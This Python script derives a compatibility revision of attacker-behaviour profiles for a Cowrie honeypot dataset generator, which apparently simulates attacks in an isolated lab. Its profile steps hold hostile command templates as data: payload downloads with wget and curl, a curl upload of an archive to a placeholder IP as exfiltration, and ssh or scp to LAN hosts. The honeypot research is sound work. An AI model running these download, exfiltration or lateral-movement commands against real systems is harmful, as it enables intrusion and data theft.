"""Derive dataset_builder/profiles_v2_compat.json from profiles_v2_isolated.json (which stays unchanged).

Only three profiles change, each for a documented Cowrie behaviour (reports/cowrie_profile_compatibility_v2/report.md):
  botnet             wget to an IP hangs Cowrie's emulated shell (wget.py error handler references the missing
                     twisted.internet.error.ConnectingDone); wget now targets a .example name, whose DNS failure
                     takes wget's handled path and exits.
  data_exfiltration  emulated scp never returns (it reads stdin as file data); the scp alternative is removed.
  lateral_movement   emulated ssh is interactive (yes/no and password prompts); both ssh forms are removed and the
                     step becomes SSH client-configuration inspection. Connection attempts are NOT represented.
"""
import copy
import json
from pathlib import Path

REPO = Path(__file__).resolve().parents[2]
SRC = REPO / "dataset_builder" / "profiles_v2_isolated.json"
DST = REPO / "dataset_builder" / "profiles_v2_compat.json"

if DST.exists():
    raise SystemExit(f"{DST} exists; refusing to overwrite")
src = json.loads(SRC.read_text(encoding="utf-8"))
out = copy.deepcopy(src)
out["version"] = "2.2.0-compat"
out["description"] = (src["description"] + " Compatibility revision 2.2.0 (2026-11-10): commands that block Cowrie's "
                      "emulated shell were replaced or removed for botnet, data_exfiltration and lateral_movement; "
                      "see reports/cowrie_profile_compatibility_v2/report.md. delay_range is ignored by generator 2.1.")
out["derived_from"] = {"file": "dataset_builder/profiles_v2_isolated.json", "version": src["version"]}
by_name = {p["name"]: p for p in out["profiles"]}


def replace_step(profile, old, new, note):
    steps = by_name[profile]["steps"]
    hits = [i for i, s in enumerate(steps) if s == old]
    assert len(hits) == 1, (profile, old, hits)
    steps[hits[0]] = new
    by_name[profile].setdefault("compat_notes", []).append(note)


replace_step("botnet",
             ["wget http://{ip}/{bin}", "curl -O http://{domain}/{bin}"],
             ["wget http://{domain}/{bin}", "curl -O http://{domain}/{bin}"],
             "wget target changed from {ip} to {domain}: in the isolated lab wget to an IP hangs Cowrie's shell; "
             "a DNS failure is handled and wget exits. Both download commands are still recorded; neither succeeds.")
replace_step("data_exfiltration",
             {"p": 0.8, "cmd": ["curl -T {dir}/d.tgz http://{ip}/u", "scp {dir}/d.tar root@{lan_ip}:/tmp/"]},
             {"p": 0.8, "cmd": ["curl -T {dir}/d.tgz http://{ip}/u"]},
             "scp alternative removed: Cowrie's emulated scp waits for stdin indefinitely. The curl upload attempt "
             "remains; it fails in the isolated lab and that failure is not hidden.")
replace_step("lateral_movement",
             {"p": 0.6, "cmd": ["ssh root@{lan_ip}", "ssh -o StrictHostKeyChecking=no admin@{lan_ip}"]},
             {"p": 0.6, "cmd": ["cat ~/.ssh/config", "ls -la ~/.ssh"]},
             "ssh connection attempts removed: Cowrie's emulated ssh is interactive and blocks. Replaced by SSH "
             "client-configuration inspection, which is reconnaissance, not a substitute for a connection attempt. "
             "V2 lateral_movement therefore represents discovery and reachability probing only.")

DST.write_text(json.dumps(out, indent=2) + "\n", encoding="utf-8")
print("wrote", DST.relative_to(REPO), "version", out["version"])
